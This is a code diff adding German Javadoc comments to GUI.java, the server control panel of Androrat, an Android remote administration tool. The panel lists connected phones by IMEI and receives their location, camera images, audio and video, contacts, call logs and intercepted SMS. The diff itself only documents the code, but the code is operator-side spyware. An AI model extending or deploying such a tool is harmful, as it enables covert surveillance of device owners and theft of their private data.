@@ -53,6 +53,9 @@ import java.awt.event.MouseEvent;
 import java.awt.Dimension;
 import java.awt.Font;
 
+/**
+ * Diese Klasse ist zum Verwalten und Erstellen der GUI die zu Begin des Programmes dargestellt wird.
+ */
 public class GUI extends javax.swing.JFrame {
 	
 	private JMenuItem buttonRemoveUser;
@@ -80,6 +83,11 @@ public class GUI extends javax.swing.JFrame {
     private JMenuItem mntmGiveCall;
     private JMenuItem mntmPort;
 
+    /**
+     * Der Konsturktor der Klasse erstellt die GUI und gibt eine LogNachricht aus
+     * @param server    Der Server
+     * @param port  Der Port
+     */
     public GUI(Server server, int port) {
     	
     	this.server = server;
@@ -107,20 +115,33 @@ public class GUI extends javax.swing.JFrame {
     // *******************************
     //	M�thodes du log gui
     // *******************************
-    
+
+    /**
+     * Zum Erstellen vnon Fehlernachrichten. Diese werden hier dem Panel hinzugeüfgt
+     * @param txt   Der Text
+     */
     public void logErrTxt(String txt) {
     	logPanel.append(Color.red, (new Date(System.currentTimeMillis())+ " "+txt+"\n"));
     }
-    
+    /**
+     * Zum Erstellen vnon Lognachrichten. Diese werden hier dem Panel hinzugeüfgt
+     * @param txt   Der Text
+     */
     public void logTxt(String txt) {
     	logPanel.append(Color.black, (new Date(System.currentTimeMillis())+ " "+txt+"\n"));
     }
-    
+    /**
+     * Zum Erstellen vnon Lognachrichten des Clients. Diese werden hier dem Panel hinzugeüfgt
+     * @param txt   Der Text
+     */
     public void clientLogTxt(String imei, long date, String txt) {
     	guiMap.get(imei).logTxt(date, txt);
     	//logPanel.append(Color.gray, "Client ("+imei+") at "+(new Date(date))+" : "+txt+"\n");
     }
-    
+    /**
+     * Zum Erstellen vnon Fehlernachrichten des Client. Diese werden hier dem Panel hinzugeüfgt
+     * @param txt   Der Text
+     */
     public void clientErrLogTxt(String imei, long date, String txt) {
     	guiMap.get(imei).errLogTxt(date, txt);
     	//logPanel.append(Color.red, "Client ("+imei+") at "+(new Date(date))+" : "+txt+"\n");
@@ -131,7 +152,11 @@ public class GUI extends javax.swing.JFrame {
     // *******************************
     //	M�thodes des boutons du menu
     // *******************************
-    
+
+    /**
+     * Diese Methode wird aufgerufen wenn der button Exit gedrückt wird.
+     * Hier werden dann die Disconnect Informationen an den Client gesendent, in dem im Portocol das DISCONNECT Flag gesetzt wird.
+     */
     private void buttonStartActionPerformed() {
     	try {
 	    	for(int row = 0; row < userTable.getRowCount(); row++) {
@@ -144,7 +169,11 @@ public class GUI extends javax.swing.JFrame {
     		this.dispose();
     	}
     }
-    
+
+    /**
+     * Diese Methode wird aufgerufen wenn ein User ausgewählt wurde und Open User Interface gedrückt wird.
+     * Danach wird eine neue USERGui erstellt um genauere Informationen über das Gerät zu erhalten.
+     */
     private void buttonUserGUIActionPerformed() {
     	int row = userTable.getSelectedRow();
         if(row != -1) {
@@ -165,6 +194,11 @@ public class GUI extends javax.swing.JFrame {
         }
     }
 
+    /**
+     * Diese Methode wird verwendent wenn die Schlatfläche Disconnet User gedrückt wird.
+     * Sollte dies der Fall sein so wird das Objekt aud er UserTabel zu entfernen und es wird ein Paket mit dem Flag DISCONNECT an den Client gesendet.
+     * Zum Schluss wird die deleteUser Methode aufgerufen.
+     */
     private void buttonRemoveUserActionPerformed() {
         int row = userTable.getSelectedRow();
         if(row != -1) {
@@ -177,14 +211,22 @@ public class GUI extends javax.swing.JFrame {
         	JOptionPane.showMessageDialog(this,"No client selected !\nPlease select one client.","No selection",JOptionPane.ERROR_MESSAGE);
         }
     }
-    
+
+    /**
+     * Diese Methode wird aufgerufen wenn die Schlatfläche About Androrat gedrückt wird.
+     * Hier wird dann eine DialogBox geöffnet in der die Informationen stehen.
+     */
     private void buttonAboutActionPerformed() {
     	JOptionPane.showMessageDialog(this,"Androrat is a free application developped in Java language.\n" +
     			"Autors : A.Bertrand, R.David, A.Akimov & P.Junk\n" +
     			"It is under the GNU GPL3 Licence","About Androrat",JOptionPane.INFORMATION_MESSAGE,
     			new ImageIcon(this.getIconImage()));
     }
-    
+
+    /**
+     * Diese Methode wird aufgerufen wenn die Schaltfläche Show Logs gedrückt wird.
+     * Dementsprechend wird das Log Panel entweder versteckt oder angezeigt.
+     */
     private void buttonShowLogs() {
     	if(chckbxmntmShowLogs.isSelected()) {
     		logPanel.setVisible(true);
@@ -222,7 +264,17 @@ public class GUI extends javax.swing.JFrame {
         if(operator == null) operator = "/";
         model.addUser(new User(imei, countryCode, telNumber, operator, simCountryCode, simOperator, simSerial));
     }*/
-    
+
+    /**
+     * Diese Methode wird benutzt um einen neuen User zu erstellen und diese hinzuzufügen.
+     * @param imei  Die IMEI
+     * @param countryCode   Die Länderkennung
+     * @param telNumber Die Telefonnummer
+     * @param simCountryCode    Die Länderkennung der Simkarte
+     * @param simSerial Die Seriennummer der Simkarte
+     * @param operator  Der Anbieter
+     * @param simOperator   Der Anbieter der Simkarte
+     */
     public void addUser(String imei, String countryCode, String telNumber, String simCountryCode, String simSerial, String operator, String simOperator) {
     	
     	if(countryCode == null) countryCode = "/";
@@ -234,10 +286,22 @@ public class GUI extends javax.swing.JFrame {
         
         model.addUser(new User(countryCode,imei, countryCode, telNumber, operator, simCountryCode, simOperator, simSerial));
     }
-    
+
+    /**
+     * Diese Klasse ist zum Erstellen und verwenden der Länderflagen vorhanden
+     */
 	public class MyRenderer extends DefaultTableCellRenderer
 	{
-
+        /**
+         * Diese Methode ist zum Anzeigen der Länderflage vorhanden
+         * @param table Die Tabelle
+         * @param value Die Länderkennung
+         * @param isSelected
+         * @param hasFocus
+         * @param row   Die Reihe
+         * @param column    Die Zeile
+         * @return  Das Obejkt
+         */
 		public Component getTableCellRendererComponent(JTable table, Object value, boolean isSelected, boolean hasFocus, int row, int column)
 		{
 			String country = (String) value;
@@ -261,8 +325,9 @@ public class GUI extends javax.swing.JFrame {
     //-------------------------------------------------
 
     /**
-     * Enl�ve de la table des clients, le client mis en param�tre
-     * @param imei L'identifiant du client � supprimer
+     * Diese Methode ist zum Entfernen der Clients mit der Imei gedacht.
+     * Hierzu wird der USer entfernt die Usergui unsichtbar gemacht und gelöscht.
+     * @param imei  Die IMEI.
      */
     public void deleteUser(String imei) {
         model.removeUser(imei);
@@ -274,10 +339,10 @@ public class GUI extends javax.swing.JFrame {
         guiMap.remove(imei);
         getContentPane().repaint();
     }
-    
+
     /**
-     * M�thode appel�e par les UserGUI lors de leur fermeture afin de supprimer la r�f�rence dans la HashMap
-     * @param imei L'identifiant de la fenetre
+     * Diese Methode ist zum Schließen der UserGui mit der IMEI. Um dies zu tun wird die GUI aus der GuiMap entfernt.
+     * @param imei Die IMEI
      */
     public void closeUserGUI(String imei) {
     	guiMap.remove(imei);
@@ -287,62 +352,138 @@ public class GUI extends javax.swing.JFrame {
     // *******************************
     //	M�thodes de modif des userGUI
     // *******************************
-    
+
+    /**
+     * Diese Methode erhält die IMEI und ein AdvancedInformationPacket und ruft damit die Updatemethode der entsprechenden UserGui auf (HomeTab).
+     * @param imei die Imei
+     * @param packet    Das Paket
+     */
     public void updateAdvInformations(String imei, AdvancedInformationPacket packet) {
     	UserGUI user = guiMap.get(imei);
     	user.updateHomeInformations(packet);
     }
-    
+
+    /**
+     * Erhält die Daten gibt sie an die entsprechende UserGui und den richtige Anzeige tab weiter.
+     * Zum Updaten der Informationen
+     * @param imei  Die IMEI
+     * @param ip    DIe Ip
+     * @param port  Der Port
+     * @param wait  wait
+     * @param phones    Die Telefonnummern
+     * @param sms   Die SMSnummern
+     * @param kw    Die Schlüsselwortliste
+     */
     public void updatePreference(String imei, String ip, int port, boolean wait, ArrayList<String> phones, ArrayList<String> sms, ArrayList<String> kw) {
     	UserGUI user = guiMap.get(imei);
     	user.updatePreference(ip, port, wait, phones, sms, kw);
     }
-    
+
+    /**
+     * Diese Methode ist zum Updaten der GPS Koordinaten. Hierzu wird die richtie UserGui mit Hilfe der IMEI ausgesucht und dann die update Methode des MapTabs aufgerufen.
+     * @param imei  Die IMEI
+     * @param lon   Längenrgrad
+     * @param lat   Breitengrad
+     * @param alt   Die Höhe
+     * @param speed Die Geschwindigkeit
+     * @param accuracy  Die Genauigkeit
+     */
     public void updateUserMap(String imei, double lon, double lat, double alt, float speed, float accuracy) {
     	UserGUI user = guiMap.get(imei);
     	user.updateMap(lon, lat, alt, speed, accuracy);
     }
-    
+
+    /**
+     * Diese Methode ist zum Updaten des Bilds. Dazu wird die richtige UserGUi ausgesucht und für deren Tab dann die update Methode aufgerufen.
+     * @param imei  Die Imei
+     * @param picture   Das Bild
+     */
     public void updateUserPicture(String imei, byte[] picture) {
     	UserGUI user = guiMap.get(imei);
     	user.updatePicture(picture);
     }
-    
+
+    /**
+     * Diese Methode ist zum Aktualisieren des Soundtabs vorhanden. Hier werden dann die neuen Daten abgespielt.
+     * Dazu wird die richtige UserGui per imei Idetifiziert und die addSoundBytes Methode aufgerufen.
+     * @param imei  Die IMEI
+     * @param data  Die Daten
+     */
     public void addSoungBytes(String imei, byte[] data) {
     	UserGUI user = guiMap.get(imei);
     	user.addSoundBytes(data);
     }
-    
+
+    /**
+     * Diese Methode ist zum Weiterleiten der neuen Videodaten an die richtige userGui da.
+     * @param imei  Die IMEI
+     * @param data  Die Videodaten
+     */
     public void addVideoBytes(String imei, byte[] data) {
     	UserGUI user = guiMap.get(imei);
     	user.addVideoBytes(data);
     }
-    
+
+    /**
+     * Diese Methode ist zum Aktualisieren der Daten des FileTreeTabs da.
+     * Es wird die entsprechende UserGui ausgesucht und dann die Updatemethode des Panels aufgerufen.
+     * @param imei  Die IMEI
+     * @param fileList  Die Ordnerstruktur
+     */
     public void updateFileTree(String imei, ArrayList<MyFile> fileList) {
     	UserGUI user = guiMap.get(imei);
     	user.updateFileTree(fileList);
     }
-    
+
+    /**
+     * Diese Methode ist zum Updaten der Anruflisten vorhanden. Hierzu wird die UserGui ausgewählt und dann die UpdateMethode des CallLog Panels aufgerufen.
+     * @param imei  Die IMEI
+     * @param logsList  Die Anrufliste
+     */
     public void updateUserCallLogs(String imei, ArrayList<CallPacket> logsList) {
     	UserGUI user = guiMap.get(imei);
     	user.updateCallLogs(logsList);
     }
-    
+
+    /**
+     * Diese Methode ist zum Aktualisieren der Daten der GUI sobald neue Daten am Server ankommen.
+     * Es wird dann die UserGUI mit der IMEI herausgeuscht und die Updatemethode des entsprechendn Tabs aufgerufen.
+     * @param imei  Die IMEI
+     * @param contacts  Die Kontakte
+     */
     public void updateContacts(String imei, ArrayList<Contact> contacts) {
     	UserGUI user = guiMap.get(imei);
     	user.updateContacts(contacts);
     }
-    
+
+    /**
+     * Diese Methode ist zum Hinzufügen eine neuen Anrufs vorhanden. Damit dies in der richtige UserGui geschieht wird diese mit der IMEI idetifiziert und die Updatemethode des entsprechenden Tabs aufgerufen.
+     * @param imei  Die IMEI
+     * @param type  Die Art des Anrufs
+     * @param phoneNumber   Die Telefonnummer
+     */
     public void addMonitoredCall(String imei, int type, String phoneNumber) {
     	UserGUI user = guiMap.get(imei);
     	user.addMonitoredCall(type, phoneNumber);
     }
-    
+
+    /**
+     * Diese Methode ist zum Hinzufügen einer neu empfangenen SMS vorhanden. Hierzu wird die UserGui per IMEI ausgewählt und die Updatemethode aufgerufen.
+     * @param imei  Die IMEI
+     * @param addr  Die Telefonnummern
+     * @param date  Das Datum
+     * @param body  Die Nachricht.
+     */
     public void addMonitoredSMS(String imei, String addr, long date, String body) {
     	UserGUI user = guiMap.get(imei);
     	user.addMonitoredSMS(addr, date, body);
     }
-    
+
+    /**
+     * Zum Aktualisieren der SMSListe. Hierzu wird die UserGui per IMEI ausgewählt und die Updatemethode aufgerufen.
+     * @param imei  Die IMEI
+     * @param sms   Die SMSListe
+     */
     public void updateSMS(String imei, ArrayList<SMSPacket> sms) {
     	UserGUI user = guiMap.get(imei);
     	user.updateSMS(sms);
@@ -352,48 +493,92 @@ public class GUI extends javax.swing.JFrame {
     // *******************************
     //	M�thodes pour save le channel
     // *******************************
-    
-    
+
+    /**
+     * Diese Methode ist zum Speichern des Datenkanals für die GPSDaten in der UserGui vorhanden. Die UserGui wird per IMEI ausgewählt
+     * @param imei  Die IMEI
+     * @param channel   Der Datenkanal
+     */
     public void saveMapChannel(String imei, int channel) {
     	UserGUI user = guiMap.get(imei);
     	user.saveMapChannel(channel);
     }
-    
+
+    /**
+     * Diese Methode ist zum Speichern des Datenkanals für die Anruflistendaten in der UserGui vorhanden. Die UserGui wird per IMEI ausgewählt
+     * @param imei  Die IMEI
+     * @param channel   Der Datenkanal
+     */
     public void saveCallLogChannel(String imei, int channel) {
     	UserGUI user = guiMap.get(imei);
     	user.saveCallLogChannel(channel);
     }
-    
+
+    /**
+     * Diese Methode ist zum Speichern des Datenkanals für die Kontaktdaten in der UserGui vorhanden. Die UserGui wird per IMEI ausgewählt
+     * @param imei  Die IMEI
+     * @param channel   Der Datenkanal
+     */
     public void saveContactChannel(String imei, int channel) {
     	UserGUI user = guiMap.get(imei);
     	user.saveContactChannel(channel);
     }
-    
+
+    /**
+     * Diese Methode ist zum Speichern des Datenkanals für die Smsmonitordaten in der UserGui vorhanden. Die UserGui wird per IMEI ausgewählt
+     * @param imei  Die IMEI
+     * @param channel   Der Datenkanal
+     */
     public void saveMonitorSMSChannel(String imei, int channel) {
     	UserGUI user = guiMap.get(imei);
     	user.saveMonitorSMSChannel(channel);
     }
-    
+
+    /**
+     * Diese Methode ist zum Speichern des Datenkanals für die Anruflistendaten in der UserGui vorhanden. Die UserGui wird per IMEI ausgewählt
+     * @param imei  Die IMEI
+     * @param channel   Der Datenkanal
+     */
     public void saveMonitorCallChannel(String imei, int channel) {
     	UserGUI user = guiMap.get(imei);
     	user.saveMonitorCallChannel(channel);
     }
-    
+
+    /**
+     * Diese Methode ist zum Speichern des Datenkanals für die Bilddaten in der UserGui vorhanden. Die UserGui wird per IMEI ausgewählt
+     * @param imei  Die IMEI
+     * @param channel   Der Datenkanal
+     */
     public void savePictureChannel(String imei, int channel) {
     	UserGUI user = guiMap.get(imei);
     	user.savePictureChannel(channel);
     }
-    
+
+    /**
+     * Diese Methode ist zum Speichern des Datenkanals für die Audiodaten in der UserGui vorhanden. Die UserGui wird per IMEI ausgewählt
+     * @param imei  Die IMEI
+     * @param channel   Der Datenkanal
+     */
     public void saveSoundChannel(String imei, int channel) {
     	UserGUI user = guiMap.get(imei);
     	user.saveSoundChannel(channel);
     }
-    
+
+    /**
+     * Diese Methode ist zum Speichern des Datenkanals für die Videodaten in der UserGui vorhanden. Die UserGui wird per IMEI ausgewählt
+     * @param imei  Die IMEI
+     * @param channel   Der Datenkanal
+     */
     public void saveVideoChannel(String imei, int channel) {
     	UserGUI user = guiMap.get(imei);
     	user.saveVideoChannel(channel);
     }
-    
+
+    /**
+     * Diese Methode ist zum Speichern des Datenkanals für die SMSDaten in der UserGui vorhanden. Die UserGui wird per IMEI ausgewählt
+     * @param imei  Die IMEI
+     * @param channel   Der Datenkanal
+     */
     public void saveSMSChannel(String imei, int channel) {
     	// TODO
     }
